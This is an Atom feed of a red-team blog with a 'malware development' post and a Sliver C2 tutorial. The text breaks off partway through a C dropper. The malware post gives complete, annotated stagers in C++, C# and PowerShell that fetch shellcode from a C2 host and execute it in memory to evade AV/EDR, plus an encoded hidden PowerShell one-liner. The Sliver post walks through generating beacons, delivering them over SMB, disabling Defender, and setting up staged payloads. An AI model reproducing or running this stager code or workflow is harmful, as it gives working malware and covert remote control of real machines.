<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-05-29T14:30:24+06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">john</title><subtitle>Red Team / Pentest</subtitle><author><name>Nullified</name></author><entry><title type="html">How To Start Playing HackTheBox</title><link href="http://localhost:4000/insights/HackTheBox/" rel="alternate" type="text/html" title="How To Start Playing HackTheBox" /><published>2024-05-27T00:00:00+06:00</published><updated>2024-05-27T00:00:00+06:00</updated><id>http://localhost:4000/insights/HackTheBox</id><content type="html" xml:base="http://localhost:4000/insights/HackTheBox/"><![CDATA[<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="nullified" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FF813F" data-position="Right" data-x_margin="18" data-y_margin="18"></script>]]></content><author><name>Nullified</name></author><category term="insights" /><category term="tips" /><category term="pentest" /><summary type="html"><![CDATA[How To Start Playing HackTheBox]]></summary></entry><entry><title type="html">MALDEV</title><link href="http://localhost:4000/maldev/maldev/" rel="alternate" type="text/html" title="MALDEV" /><published>2024-05-12T00:00:00+06:00</published><updated>2024-05-12T00:00:00+06:00</updated><id>http://localhost:4000/maldev/maldev</id><content type="html" xml:base="http://localhost:4000/maldev/maldev/"><![CDATA[<h1 id="malware-development-explained-line-by-line">Malware Development explained line by line</h1>

<p>Lets start with stagers!</p>

<p>You may ask: <strong>Whats is a Stager ?</strong></p>

<blockquote>
  <p>its a smaller payload that when executed, will call back to the C2 server to download and execute the second stage of the payload in-memory, which is where you actually get the beacon to execute.</p>
</blockquote>

<p>Easy, just imagine a pizza - every slice of that pepperoni pizza is a stage. After you eat one slice, you move on to the next. Ahhaha!</p>

<blockquote>
  <p>you’ll never forget it</p>
</blockquote>

<p>And a Stageless Dropper is like a Big Mac - you eat the whole thing. You Got the idea.</p>

<p><strong>When Should I use it ?</strong></p>

<p>We generally use it, when we want to get access to systems, but we cant directly run the malicious shellcode on the target machine, because it’ll get detected and blocked by AV/EDR.</p>

<p>So, we can write droppers to try to bypass these defensive measures and execute the second stage of the payload later after the callback to our C2 (for example).</p>

<style>
  .tooltip {
    position: relative;
    display: inline-block;
  }


  .tooltip .tooltiptext {
    visibility: hidden;
    width: 600px;
    max-width: 600px;
    background-color: #007bff; /* Set background color to blueish */
    color: #fff;
    text-align: left;
    border-radius: 2px;
    padding: 5px; /* Increase padding for better readability */
    position: absolute;
    top: 100%; /* Positions the tooltip below the code */
    left: 50%; /* Centers the tooltip horizontally */
    z-index: 1;
    opacity: 0;
    transition: opacity 0.3s;
    white-space: pre-wrap; /* Allow line breaks in long explanations */
  }

  .tooltip:hover .tooltiptext {
    visibility: visible;
    opacity: 1;
  }

/* Style for the chapter container */
  .chapters {
    margin: 10px;
    padding: 10px;
    border: 1px solid #333;
    border-radius: 15px; 
    font-family: 'Arial', sans-serif;
    background-color: #1a1a1a;
    color: #ddd;
    width: calc(100% - 40px);
  }

  /* Style for the details summary */
  details summary {
    cursor: pointer;
    font-weight: bold;
    background-color: #333;
    padding: 12px;
    border: 1px solid #222;
    border-radius: 8px; 
    margin-bottom: 10px;
  }

  /* Style for the details content */
  details .content {
    margin: 20px 0;
    padding: 20px;
    border: 1px solid #222;
    border-radius: 8px; 
    background-color: #090a08;
  }

</style>

<div class="chapters">
  <details>
    <summary>C++ Stager</summary>    
    <div class="content">
      <p> </p>

      <pre>
<code>
<span class="tooltip">#include &lt;windows.h&gt;<span class="tooltiptext" style="bottom: calc(100% + 25px);">Includes necessary header file for Windows API functions.</span></span>
<span class="tooltip">#include &lt;wininet.h&gt;<span class="tooltiptext">Includes necessary header file for internet-related functions.</span></span>
<span class="tooltip">#include &lt;stdio.h&gt;<span class="tooltiptext">Includes necessary header file for standard input/output operations.</span></span>

<span class="tooltip">#pragma comment (lib, "Wininet.lib")<span class="tooltiptext">Directs the linker to include the Wininet library during compilation.</span></span>

<span class="tooltip">struct Shellcode {<span class="tooltiptext">Defines a structure named Shellcode to hold shellcode data and length.</span></span>
    <span class="tooltip">byte* data;<span class="tooltiptext">Pointer to byte representing the shellcode data.</span></span>
    <span class="tooltip">DWORD len;<span class="tooltiptext">DWORD representing the length of the shellcode.</span></span>
<span class="tooltip">};<span class="tooltiptext">End of Shellcode structure definition.</span></span>

<span class="tooltip">Shellcode Download(LPCWSTR host, INTERNET_PORT port);<span class="tooltiptext">Prototype for the Download function to retrieve shellcode from a server.</span></span>
<span class="tooltip">void Execute(Shellcode shellcode);<span class="tooltiptext">Prototype for the Execute function to execute shellcode.</span></span>

<span class="tooltip">int main() {<span class="tooltiptext">Entry point of the program.</span></span>
    <span class="tooltip">::ShowWindow(::GetConsoleWindow(), SW_HIDE); <span class="tooltiptext">Hides the console window. If u dont wanna hide, just comment this line</span></span>

    <span class="tooltip">Shellcode shellcode = Download(L"sliver.labnet.local", 80);<span class="tooltiptext">Downloads shellcode from the specified server.</span></span>
    <span class="tooltip">Execute(shellcode);<span class="tooltiptext">Executes the downloaded shellcode.</span></span>

    <span class="tooltip">return 0;<span class="tooltiptext">Indicates successful termination of the program.</span></span>
<span class="tooltip">}</span>

<span class="tooltip">Shellcode Download(LPCWSTR host, INTERNET_PORT port) {<span class="tooltiptext">Downloads shellcode from a server.</span></span>
    <span class="tooltip">HINTERNET session = InternetOpen(<span class="tooltiptext">Opens an internet connection.</span></span>
        <span class="tooltip">L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",<span class="tooltiptext">Specifies the user agent for the connection.</span></span>
        <span class="tooltip">INTERNET_OPEN_TYPE_PRECONFIG,<span class="tooltiptext">Specifies the access type for the internet session.</span></span>
        <span class="tooltip">NULL,<span class="tooltiptext">Specifies the proxy server.</span></span>
        <span class="tooltip">NULL,<span class="tooltiptext">Specifies the context value.</span></span>
        <span class="tooltip">0);<span class="tooltiptext">Specifies additional options.</span></span>

    <span class="tooltip">HINTERNET connection = InternetConnect(<span class="tooltiptext">Establishes a connection to the specified server.</span></span>
        <span class="tooltip">session,<span class="tooltiptext">Handle to the internet session.</span></span>
        <span class="tooltip">host,<span class="tooltiptext">Specifies the host name.</span></span>
        <span class="tooltip">port,<span class="tooltiptext">Specifies the port number.</span></span>
        <span class="tooltip">L"",<span class="tooltiptext">Specifies the user name for authentication.</span></span>
        <span class="tooltip">L"",<span class="tooltiptext">Specifies the password for authentication.</span></span>
        <span class="tooltip">INTERNET_SERVICE_HTTP,<span class="tooltiptext">Specifies the service to connect to.</span></span>
        <span class="tooltip">0,<span class="tooltiptext">Specifies additional options.</span></span>
        <span class="tooltip">0);<span class="tooltiptext">Specifies additional flags.</span></span>

    <span class="tooltip">HINTERNET request = HttpOpenRequest(<span class="tooltiptext">Opens an HTTP request handle.</span></span>
        <span class="tooltip">connection,<span class="tooltiptext">Handle to the internet connection.</span></span>
        <span class="tooltip">L"GET",<span class="tooltiptext">Specifies the HTTP method.</span></span>
        <span class="tooltip">L"/fontawesome.woff",<span class="tooltiptext">Specifies the resource to request.</span></span>
        <span class="tooltip">NULL,<span class="tooltiptext">Specifies additional headers.</span></span>
        <span class="tooltip">NULL,<span class="tooltiptext">Specifies additional headers.</span></span>
        <span class="tooltip">0,<span class="tooltiptext">Specifies additional flags.</span></span>
        <span class="tooltip">0);<span class="tooltiptext">Specifies additional flags.</span></span>

    <span class="tooltip">WORD counter = 0;<span class="tooltiptext">Initializes a counter for the retry mechanism.</span></span>
    <span class="tooltip">while (!HttpSendRequest(request, NULL, 0, 0, 0)) {<span class="tooltiptext">Retries HTTP request until successful or max attempts reached.</span></span>
        <span class="tooltip">counter++;<span class="tooltiptext">Increments the counter.</span></span>
        <span class="tooltip">Sleep(3000);<span class="tooltiptext">Pauses execution for 3 seconds.</span></span>
        <span class="tooltip">if (counter &gt;= 3) {<span class="tooltiptext">Checks if max attempts reached.</span></span>
            <span class="tooltip">exit(0);<span class="tooltiptext">Exits the program if max attempts reached.</span></span>
        <span class="tooltip">}<span class="tooltiptext">End of if statement.</span></span>
    <span class="tooltip">}<span class="tooltiptext">End of while loop.</span></span>

    <span class="tooltip">DWORD bufSize = BUFSIZ;<span class="tooltiptext">Initial buffer size for reading response.</span></span>
    <span class="tooltip">byte* buffer = new byte[bufSize];<span class="tooltiptext">Allocates memory for response buffer.</span></span>

    <span class="tooltip">DWORD capacity = bufSize;<span class="tooltiptext">Initial capacity for payload buffer.</span></span>
    <span class="tooltip">byte* payload = (byte*)malloc(capacity);<span class="tooltiptext">Allocates memory for payload.</span></span>

    <span class="tooltip">DWORD payloadSize = 0;<span class="tooltiptext">Initial size of payload.</span></span>

    <span class="tooltip">while (true) {<span class="tooltiptext">Loop to read response and build payload.</span></span>
        <span class="tooltip">DWORD bytesRead;<span class="tooltiptext">Variable to store number of bytes read.</span></span>

        <span class="tooltip">if (!InternetReadFile(request, buffer, bufSize, &amp;bytesRead)) {<span class="tooltiptext">Reads data from an internet file.</span></span>
            <span class="tooltip">exit(0);<span class="tooltiptext">Exits the program if reading fails.</span></span>
        <span class="tooltip">}<span class="tooltiptext">End of if statement.</span></span>

        <span class="tooltip">if (bytesRead == 0) break;<span class="tooltiptext">Breaks loop if no more data to read.</span></span>

        <span class="tooltip">if (payloadSize + bytesRead &gt; capacity) {<span class="tooltiptext">Checks if payload buffer needs resizing.</span></span>
            <span class="tooltip">capacity *= 2;<span class="tooltiptext">Doubles the capacity of the payload buffer.</span></span>
            <span class="tooltip">byte* newPayload = (byte*)realloc(payload, capacity);<span class="tooltiptext">Resizes the payload buffer.</span></span>
            <span class="tooltip">payload = newPayload;<span class="tooltiptext">Assigns the resized payload buffer.</span></span>
        <span class="tooltip">}<span class="tooltiptext">End of if statement.</span></span>

        <span class="tooltip">for (DWORD i = 0; i &lt; bytesRead; i++) {<span class="tooltiptext">Iterates over the read bytes.</span></span>
            <span class="tooltip">payload[payloadSize++] = buffer[i];<span class="tooltiptext">Copies the read bytes into the payload buffer.</span></span>
        <span class="tooltip">}<span class="tooltiptext">End of for loop.</span></span>
        
    <span class="tooltip">}<span class="tooltiptext">End of while loop.</span></span>
    <span class="tooltip">byte* newPayload = (byte*)realloc(payload, payloadSize);<span class="tooltiptext">Resizes the payload buffer to fit the actual data.</span></span>

    <span class="tooltip">InternetCloseHandle(request);<span class="tooltiptext">Closes the HTTP request handle.</span></span>
    <span class="tooltip">InternetCloseHandle(connection);<span class="tooltiptext">Closes the internet connection handle.</span></span>
    <span class="tooltip">InternetCloseHandle(session);<span class="tooltiptext">Closes the internet session handle.</span></span>

    <span class="tooltip">struct Shellcode out;<span class="tooltiptext">Defines a variable of type Shellcode to hold the downloaded shellcode.</span></span>
    <span class="tooltip">out.data = payload;<span class="tooltiptext">Assigns the payload to the Shellcode variable.</span></span>
    <span class="tooltip">out.len = payloadSize;<span class="tooltiptext">Assigns the payload size to the Shellcode variable.</span></span>
    <span class="tooltip">return out;<span class="tooltiptext">Returns the downloaded shellcode.</span></span>
<span class="tooltip">}<span class="tooltiptext">End of Download function.</span></span>

<span class="tooltip">void Execute(Shellcode shellcode) {<span class="tooltiptext">Function to execute the downloaded shellcode.</span></span>
    <span class="tooltip">void* exec = VirtualAlloc(0, shellcode.len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);<span class="tooltiptext">Allocates memory with execute permissions.</span></span>
    <span class="tooltip">memcpy(exec, shellcode.data, shellcode.len);<span class="tooltiptext">Copies the shellcode to the allocated memory.</span></span>
    <span class="tooltip">((void(*)())exec)();<span class="tooltiptext">Casts the allocated memory as a function and executes it.</span></span>
<span class="tooltip">}<span class="tooltiptext">End of Execute function.</span></span>
</code>
</pre>

      <script>
// Add event listeners to tooltip triggers
document.querySelectorAll('.tooltip').forEach(item => {
  item.addEventListener('mouseenter', event => {
    const tooltip = event.target.querySelector('.tooltiptext');
    tooltip.style.visibility = 'visible';
    tooltip.style.opacity = '1';
  });

  item.addEventListener('mouseleave', event => {
    const tooltip = event.target.querySelector('.tooltiptext');
    tooltip.style.visibility = 'hidden';
    tooltip.style.opacity = '0';
  });
});
</script>

    </div>
  </details>

  <details>
    <summary>C# Stager</summary>    
    <div class="content">

      <pre>
<code>
<span class="tooltip">using System;<span class="tooltiptext" style="bottom: calc(100% + 25px);">Imports the System namespace, providing fundamental classes and base classes.</span></span>
<span class="tooltip">using System.Net;<span class="tooltiptext">Imports the System.Net namespace, providing classes for networking, including the WebClient class.</span></span>
<span class="tooltip">using System.Runtime.InteropServices;<span class="tooltiptext">Imports the System.Runtime.InteropServices namespace, providing types useful for interoperation between managed and unmanaged code.</span></span>

<span class="tooltip">namespace Sliver_stager {<span class="tooltiptext">Declares a namespace called Sliver_stager to encapsulate related types.</span></span>
    <span class="tooltip">class Program {<span class="tooltiptext">Declares a class named Program.</span></span>
        <span class="tooltip">public static void Main(String[] args) {<span class="tooltiptext">Declares the entry point of the program.</span></span>
            <span class="tooltip">byte[] shellcode = Download("http://sliver.labnet.local/fontawesome.woff");<span class="tooltiptext">Downloads shellcode from the specified URL.</span></span>
            <span class="tooltip">Execute(shellcode);<span class="tooltiptext">Executes the downloaded shellcode.</span></span>
            <span class="tooltip">return;<span class="tooltiptext">Indicates successful termination of the program.</span></span>
        <span class="tooltip">}<span class="tooltiptext">End of Main method.</span></span>
        
        <span class="tooltip">private static byte[] Download(string url) {<span class="tooltiptext">Declares a method to download shellcode from a URL.</span></span>
            <span class="tooltip">ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) =&gt; true;<span class="tooltiptext">Disables SSL certificate validation.</span></span>
            <span class="tooltip">System.Net.WebClient client = new System.Net.WebClient();<span class="tooltiptext">Creates a WebClient instance for downloading data.</span></span>
            <span class="tooltip">byte[] shellcode = client.DownloadData(url);<span class="tooltiptext">Downloads shellcode data from the specified URL.</span></span>
            <span class="tooltip">return shellcode;<span class="tooltiptext">Returns the downloaded shellcode.</span></span>
        <span class="tooltip">}<span class="tooltiptext">End of Download method.</span></span>
        

        <span class="tooltip">[DllImport("kernel32")]<span class="tooltiptext">Declares a method imported from the kernel32 DLL.</span></span>
        <span class="tooltip">static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);<span class="tooltiptext">Defines the VirtualAlloc method for memory allocation.</span></span>
        
        <span class="tooltip">[DllImport("kernel32")]<span class="tooltiptext">Declares a method imported from the kernel32 DLL.</span></span>
        <span class="tooltip">static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);<span class="tooltiptext">Defines the CreateThread method for thread creation.</span></span>
        
        <span class="tooltip">[DllImport("kernel32.dll")]<span class="tooltiptext">Declares a method imported from the kernel32 DLL.</span></span>
        <span class="tooltip">static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);<span class="tooltiptext">Defines the WaitForSingleObject method for thread synchronization.</span></span>
        
        <span class="tooltip">private static void Execute(byte[] shellcode) {<span class="tooltiptext">Declares a method to execute the downloaded shellcode.</span></span>
            <span class="tooltip">IntPtr addr = VirtualAlloc(IntPtr.Zero, (UInt32)shellcode.Length, 0x1000, 0x40);<span class="tooltiptext">Allocates memory for the shellcode.</span></span>
            <span class="tooltip">Marshal.Copy(shellcode, 0, (IntPtr)(addr), shellcode.Length);<span class="tooltiptext">Copies the shellcode to the allocated memory.</span></span>
            
            <span class="tooltip">IntPtr hThread = IntPtr.Zero;<span class="tooltiptext">Declares a handle for the thread.</span></span>
            <span class="tooltip">IntPtr threadId = IntPtr.Zero;<span class="tooltiptext">Declares a variable for the thread ID.</span></span>
            <span class="tooltip">hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, threadId);<span class="tooltiptext">Creates a new thread to execute the shellcode.</span></span>
            
            <span class="tooltip">WaitForSingleObject(hThread, 0xFFFFFFFF);<span class="tooltiptext">Waits for the thread to finish execution.</span></span>
        
            <span class="tooltip">return;<span class="tooltiptext">Indicates successful completion of the method.</span></span>
        <span class="tooltip">}<span class="tooltiptext">End of Execute method.</span></span>
    <span class="tooltip">}<span class="tooltiptext">End of Program class.</span></span>
<span class="tooltip">}<span class="tooltiptext">End of Sliver_stager namespace.</span></span>
</code>
</pre>

    </div>
  </details>

  <details>
    <summary>Powershell Stager</summary>    
    <div class="content">

      <pre>
<code>
<span class="tooltip">$Win32 = @"<span class="tooltiptext" style="bottom: calc(100% + 25px);">Defines a PowerShell Here-String that contains C# code.</span></span>
<span class="tooltip">using System;<span class="tooltiptext">Imports the System namespace.</span></span>
<span class="tooltip">using System.Runtime.InteropServices;<span class="tooltiptext">Imports the System.Runtime.InteropServices namespace.</span></span>
<span class="tooltip">public class Win32 {<span class="tooltiptext">Declares a public class named Win32.</span></span>
<span class="tooltip">[DllImport("kernel32")]<span class="tooltiptext">Declares a method imported from the kernel32 DLL.</span></span>
<span class="tooltip">public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);<span class="tooltiptext">Defines the VirtualAlloc method for memory allocation.</span></span>
<span class="tooltip">[DllImport("kernel32", CharSet=CharSet.Ansi)]<span class="tooltiptext">Declares a method imported from the kernel32 DLL with CharSet set to Ansi.</span></span>
<span class="tooltip">public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);<span class="tooltiptext">Defines the CreateThread method for thread creation.</span></span>
<span class="tooltip">[DllImport("kernel32.dll", SetLastError=true)]<span class="tooltiptext">Declares a method imported from the kernel32 DLL with SetLastError set to true.</span></span>
<span class="tooltip">public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);<span class="tooltiptext">Defines the WaitForSingleObject method for thread synchronization.</span></span>
<span class="tooltip">}<span class="tooltiptext">End of Win32 class definition.</span></span>
<span class="tooltip">"@<span class="tooltiptext">End of PowerShell Here-String.</span></span>
<span class="tooltip">Add-Type $Win32<span class="tooltiptext">Adds the C# code to the PowerShell session, creating the Win32 class.</span></span>
<span class="tooltip">$shellcode = (New-Object System.Net.WebClient).DownloadData("http://sliver.labnet.local/fontawesome.woff")<span class="tooltiptext">Downloads shellcode from the specified URL using WebClient.</span></span>
<span class="tooltip">if ($shellcode -eq $null) {Exit};<span class="tooltiptext">Exits the script if shellcode is not downloaded successfully.</span></span>
<span class="tooltip">$size = $shellcode.Length<span class="tooltiptext">Gets the length of the downloaded shellcode.</span></span>

<span class="tooltip">[IntPtr]$addr = [Win32]::VirtualAlloc(0, $size, 0x1000, 0x40);<span class="tooltiptext">Allocates memory for the shellcode using the VirtualAlloc method from the Win32 class.</span></span>
<span class="tooltip">[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $addr, $size)<span class="tooltiptext">Copies the shellcode to the allocated memory.</span></span>
<span class="tooltip">$thandle = [Win32]::CreateThread(0, 0, $addr, 0, 0, 0);<span class="tooltiptext">Creates a new thread to execute the shellcode using the CreateThread method from the Win32 class.</span></span>
<span class="tooltip">[Win32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")<span class="tooltiptext">Waits for the thread to finish executing the shellcode.</span></span>
</code>
</pre>

      <blockquote>
        <p>U can convert the code to base64</p>
      </blockquote>

      <p>if u r on Linux:</p>
      <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat pw_stager.ps1 | iconv --to-code UTF-16LE | base64 -w 0
</code></pre></div>      </div>

      <p>Then just execute as an One Liner:</p>
      <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell.exe -nop -w hidden -Enc JABXA...QAKAA==
</code></pre></div>      </div>

    </div>
  </details>
</div>]]></content><author><name>Nullified</name></author><category term="maldev" /><category term="maldev" /><summary type="html"><![CDATA[MALDEV]]></summary></entry><entry><title type="html">Sliver C2</title><link href="http://localhost:4000/c2/sliverbasics/" rel="alternate" type="text/html" title="Sliver C2" /><published>2024-04-11T00:00:00+06:00</published><updated>2024-04-11T00:00:00+06:00</updated><id>http://localhost:4000/c2/sliverbasics</id><content type="html" xml:base="http://localhost:4000/c2/sliverbasics/"><![CDATA[<h1 id="sliver">SLIVER</h1>

<p><img src="/assets/images/posts/c2/c2-teaser.jpg" alt="Alt text" width="500" class="align-center" /></p>

<h2 id="doc">DOC</h2>

<p>https://sliver.sh/</p>

<p>https://github.com/BishopFox/sliver</p>

<h2 id="installation">Installation</h2>
<p>curl https://sliver.sh/install|sudo bash</p>

<p>u can start the server with systemctl</p>

<p>run:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sliver
</code></pre></div></div>

<h2 id="types-of-implants">Types of implants</h2>

<ul>
  <li>Beacons = will check in with your Server from time to time to see if u wrote some command to be executed</li>
  <li>Session = its real time response, similar to a reverse shell</li>
</ul>

<blockquote>
  <p>Similar but not the same. Shell is even easier to detect</p>
</blockquote>

<p>Generating the Beacon:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>generate beacon --http &lt;C2 IP&gt; --save .
</code></pre></div></div>

<p><img src="/assets/images/posts/c2/1.png" alt="Alt text" class="align-center" /></p>

<p>After that, u can run SMB SERVER using IMPACKET to transfer it to the remote Windows Machine</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbserver.py kali . -smb2support -username anon -password anon
</code></pre></div></div>

<p><img src="/assets/images/posts/c2/2.png" alt="Alt text" class="align-center" /></p>

<p><strong>On Windows</strong></p>

<p>Connect:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net use \\&lt;C2 ip&gt;\kali /USER:anon anon
</code></pre></div></div>

<p>Copy the File:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>copy \\&lt;C2 ip&gt;\kali\&lt;beacon.exe&gt; .
</code></pre></div></div>
<p><img src="/assets/images/posts/c2/3.png" alt="Alt text" class="align-center" /></p>

<p><img src="/assets/images/posts/c2/4.png" alt="Alt text" class="align-center" /></p>

<blockquote>
  <p>Bypass in necessary if the AV/EDR are enable (So, for now just disable Defender)</p>
</blockquote>

<blockquote>
  <p>I’ll write about evasion in future posts and How to use staged payloads in Sliver</p>
</blockquote>

<h2 id="listener">Listener</h2>

<ul>
  <li>http/https - for communication over the HTTP(S) protocol, pretty standard across any C2</li>
  <li>mtls - communication using mutual-TLS, a protocol in which both the implant and the server present a certificate that the other must validate. If one certificate fails, the connection does not happen.</li>
  <li>wg - communication using WireGuard, which essentially creates a lightweight VPN to communicate over.</li>
  <li>dns -This is all UDP and its not recommended for beginners.</li>
</ul>

<blockquote>
  <p>Since our beacon was only configured to have an http callback, we can run http in our shell and then execute the beacon on the remote Windows computer.</p>
</blockquote>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sliver &gt; http
</code></pre></div></div>

<p><img src="/assets/images/posts/c2/5.png" alt="Alt text" class="align-center" /></p>

<h2 id="beacons">Beacons</h2>

<p>To see the open beacons just type:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sliver &gt; beacons 
</code></pre></div></div>

<p><img src="/assets/images/posts/c2/6.png" alt="Alt text" class="align-center" /></p>

<ul>
  <li>As we did a Beacon instead of a Session, the beacon will check every now and then.</li>
  <li>Sliver also has <strong>Jitter</strong>, which will make the checks a little irregular so will be less suspicious</li>
</ul>

<p>To interact:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use &lt;beacon ID&gt;
#beacons rm = to delete beacons
#beacons -k &lt;ID or -K = to kill beacons
</code></pre></div></div>

<p><img src="/assets/images/posts/c2/7.png" alt="Alt text" class="align-center" /></p>

<p>You’ll notice that it will take a time to SLIVER get the result because of the check in time</p>

<p><img src="/assets/images/posts/c2/8.png" alt="Alt text" class="align-center" /></p>

<p>To show commands executed before:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tasks

tasks fetch &lt;ID&gt;
</code></pre></div></div>

<p><img src="/assets/images/posts/c2/9.png" alt="Alt text" class="align-center" /></p>

<h2 id="sessions">sessions</h2>

<p>U can change from beacon to session, but not vice-versa:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>interactive
use &lt;ID&gt;
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sessions

sessions -K = to kill all sessions
sessions -k = (lowercase) to kill specific sessions
</code></pre></div></div>

<p><img src="/assets/images/posts/c2/10.png" alt="Alt text" class="align-center" /></p>

<h2 id="profiles">PROFILES</h2>
<p>Save Profile:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>profiles new beacon --arch amd64 --os windows --mtls &lt;C2 IP&gt;:443 -f shellcode --evasion --timeout 300 --seconds 5 --jitter 1 profile_name
</code></pre></div></div>

<p>Generate the beacon:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>profiles generate --save . profile_name
</code></pre></div></div>

<blockquote>
  <p>You can also generate session implants in the same way, just omit the beacon part.</p>
</blockquote>

<p>To show the Profiles:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>profiles
</code></pre></div></div>

<p>To show the Implants:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>implants
</code></pre></div></div>

<p>If u need to recover a deleted implant:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>regenerate &lt;name of implant&gt;
</code></pre></div></div>

<h2 id="post-exploitation">Post-Exploitation</h2>

<h3 id="staging">Staging</h3>

<ul>
  <li>Stegeless = one single binary that connects back to u</li>
  <li>Staged = Dropper, its a smaller payload that when executed, will call back to the C2 server to download and execute the second stage of the payload in-memory, which is where you actually get the beacon to execute.</li>
</ul>

<p>Create the Profile:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>profiles new beacon --arch amd64 --os windows --mtls &lt;C2 IP&gt;:443 -f shellcode --timeout 300 --seconds 5 --jitter 1 profile_name
</code></pre></div></div>

<p>Create the Listener to the initial Callback:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stage-listener --url http://&lt;C2 IP&gt;:8080 --profile profile_name --prepend-size
</code></pre></div></div>

<blockquote>
  <p>–prepend-size if you are going to use some as Metasploit/msfvenom stager
Dont use the flag if you are going to write your own stager</p>
</blockquote>

<p>Start the second Listener to get the second callback:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mtls --lhost &lt;C2 IP&gt; --lport 443
</code></pre></div></div>

<p>Generate the Stager:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>generate stager -r http --lhost &lt;C2 IP&gt; --lport 8080
</code></pre></div></div>

<p>Example of Dropper in C:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span>
<span class="c1">// Define your shellcode here</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
    <span class="c1">// Your shellcode goes here</span>
<span class="p">};</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">LPVOID</span> <span class="n">lpAlloc</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">dwOldProtect</span><span class="p">;</span>
    <span class="n">HANDLE</span> <span class="n">hThread</span><span class="p">;</span>

    <span class="c1">// Allocate memory</span>
    <span class="n">lpAlloc</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">lpAlloc</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"VirtualAlloc failed: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// Copy shellcode to allocated memory</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">lpAlloc</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>

    <span class="c1">// Change memory protection</span>
